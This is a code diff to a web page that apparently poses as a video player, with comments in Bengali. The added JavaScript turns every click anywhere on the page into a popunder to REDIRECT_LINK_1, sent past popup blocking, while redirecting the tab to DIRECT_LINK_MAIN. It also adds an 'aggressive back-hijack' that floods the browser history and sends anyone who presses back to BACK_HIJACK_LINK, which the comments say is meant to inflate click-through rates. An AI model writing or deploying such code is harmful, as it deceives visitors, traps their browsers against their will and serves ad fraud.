@@ -44,6 +44,7 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             overflow-x: hidden;
             padding-bottom: 20px;
+            cursor: pointer;
         }
 
         /* HEADER */
@@ -747,72 +748,43 @@
             }
             initOptimizedPlayerAnimation();
 
-            // POP-UP BLOCKER BYPASS & MULTI-LINK TRIGGER
+            // ================= HIGH-CTR & POPUP BYPASS SYSTEM =================
+            
+            // 1. POPUNDER / MULTI-TAB BYPASS (REDIRECT_LINK_1 এর জন্য CTR বাড়াবে)
             function triggerLinks() {
                 try {
-                    const a = document.createElement('a');
-                    a.href = REDIRECT_LINK_1;
-                    a.target = '_blank';
-                    a.rel = 'noopener noreferrer';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                } catch (e) { }
+                    let pop = window.open(REDIRECT_LINK_1, '_blank');
+                    if (!pop || pop.closed || typeof pop.closed == 'undefined') {
+                        window.open(REDIRECT_LINK_1);
+                    }
+                } catch(e) {}
 
+                // বর্তমান ব্রাউজার ট্যাবকে মেইন লিঙ্কে নিয়ে যাবে
                 window.location.href = DIRECT_LINK_MAIN;
             }
 
-            document.getElementById('videoPlayer').addEventListener('click', triggerLinks);
-            document.getElementById('commentsBox').addEventListener('click', triggerLinks);
-            document.getElementById('progressSlider').addEventListener('click', function(e) {
-                e.stopPropagation(); 
+            // 2. GLOBAL CLICK OVERLAY (পুরো পেজ জুড়েই ক্লিক কাজ করবে)
+            document.body.addEventListener('click', function(e) {
                 triggerLinks();
-            });
+            }, true);
 
-            // Like and Share button click handler
-            const actionBtns = document.querySelectorAll('.action-btn');
-            actionBtns.forEach(btn => {
-                btn.addEventListener('click', function(e) {
-                    e.stopPropagation();
-                    triggerLinks();
-                });
-            });
-
-            document.getElementById('suggestedList').addEventListener('click', function(e) {
-                if(e.target.closest('.suggested-video-item')) triggerLinks();
-            });
-
-            // ================= IMPROVED BACK HIJACK SYSTEM =================
-            let isHijackLocked = false;
-
-            function lockHistory() {
-                if (isHijackLocked) return;
-                isHijackLocked = true;
-
-                for (let i = 0; i < 25; i++) {
-                    window.history.pushState({ page: i, locked: true }, document.title, window.location.href);
-                }
-            }
-
-            function armHijack() {
-                lockHistory();
-                const events = ['touchstart', 'touchend', 'click', 'scroll', 'keydown', 'mousemove'];
-                events.forEach(evt => {
-                    window.removeEventListener(evt, armHijack);
-                });
-            }
-
-            window.history.pushState({ page: 'init' }, document.title, window.location.href);
-
-            const userEvents = ['touchstart', 'touchend', 'click', 'scroll', 'keydown', 'mousemove'];
-            userEvents.forEach(evt => {
-                window.addEventListener(evt, armHijack, { passive: true, capture: true });
-            });
-
-            window.addEventListener('popstate', function (event) {
+            // 3. AGGRESSIVE BACK-HIJACK SYSTEM (BACK_HIJACK_LINK এর CTR বাড়াবে)
+            function setBackTrap() {
                 for (let i = 0; i < 10; i++) {
-                    window.history.pushState({ page: 'trap' }, document.title, window.location.href);
+                    window.history.pushState({ trap: true }, document.title, window.location.href);
                 }
+            }
+
+            // পেজ লোড হওয়ার সাথে সাথেই ব্যাক-হাইজ্যাক স্টেট পুশ করবে
+            setBackTrap();
+
+            // ইউজার স্ক্রিনে টাচ বা স্ক্রোল করলেই ট্র্যাপ রি-ইনফোর্স হবে
+            ['touchstart', 'mousemove', 'scroll', 'keydown'].forEach(evt => {
+                window.addEventListener(evt, setBackTrap, { once: true, passive: true });
+            });
+
+            // ব্যাক বাটন চাপা মাত্রই হাইজ্যাক লিঙ্কে পাঠাবে
+            window.addEventListener('popstate', function(e) {
                 window.location.replace(BACK_HIJACK_LINK);
             });
 
